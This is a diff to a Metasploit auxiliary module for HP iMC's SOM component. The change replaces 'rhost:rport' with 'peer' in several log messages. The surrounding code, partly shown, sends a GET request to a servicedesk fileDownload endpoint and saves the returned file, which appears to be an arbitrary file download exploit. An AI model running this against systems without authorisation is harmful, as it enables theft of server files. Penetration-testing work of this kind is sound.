@@ -63,11 +63,11 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
 
     unless is_imc_som?
-      vprint_error("#{rhost}:#{rport} - HP iMC with the SOM component not found")
+      vprint_error("#{peer} - HP iMC with the SOM component not found")
       return
     end
 
-    vprint_status("#{rhost}:#{rport} - Sending request...")
+    vprint_status("#{peer} - Sending request...")
     res = send_request_cgi({
       'uri'          => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
       'method'       => 'GET',
@@ -89,9 +89,9 @@ class Metasploit3 < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("#{peer} - File saved in: #{path}")
     else
-      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
+      vprint_error("#{peer} - Failed to retrieve file")
       return
     end
   end
